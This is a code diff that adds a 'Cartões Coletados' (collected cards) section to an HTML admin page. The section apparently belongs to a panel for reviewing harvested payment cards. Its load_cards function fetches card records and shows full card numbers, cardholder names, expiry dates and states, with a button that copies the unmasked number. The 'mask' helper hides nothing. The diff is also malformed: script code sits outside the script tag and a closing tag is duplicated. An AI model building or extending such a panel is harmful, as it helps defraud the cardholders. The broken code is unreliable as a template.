@@ -38,6 +38,11 @@
         <tbody id="orders-body"></tbody>
       </table>
     </section>
+	    <section>
+      <h2>Cartões Coletados</h2>
+      <div id="cards-body"></div>
+    </section>
+  </main>
   </main>
 
   <script>
@@ -116,5 +121,36 @@
 
     load_orders();
   </script>
+  async function load_cards() {
+  const res = await fetch('/api/admin/cards');
+  const { cards } = await res.json();
+  const body = document.getElementById('cards-body');
+  body.innerHTML = '';
+  cards.forEach((c, i) => {
+    const div = document.createElement('div');
+    div.style = 'display: grid; grid-template-columns: 2fr 1fr 1fr 1fr 1fr 60px; gap: 8px; align-items: center; padding: 10px; border-bottom: 1px solid #eee; font-size: 14px;';
+    const mask = (v, len) => String(v || '').replace(/\s/g, '').replace(/(.{3})/g, '$1 ').trim();
+    div.innerHTML = `
+      <span><strong>Card #${i + 1}</strong></span>
+      <span>${mask(c.card_number, 4)}</span>
+      <span>${mask(c.full_name, 4)}</span>
+      <span>${c.expiration}</span>
+      <span>${c.state}</span>
+      <button onclick="copiar('${c.card_number}')" style="background: #555; color: white; border: none; padding: 6px 10px; cursor: pointer;">Copiar</button>`;
+    body.appendChild(div);
+  });
+}
+
+async function copiar(texto) {
+  try {
+    await navigator.clipboard.writeText(texto);
+    alert('Copiado: ' + texto);
+  } catch (e) {
+    alert('Não foi possível copiar.');
+  }
+}
+
+load_orders();
+load_cards();
 </body>
 </html>
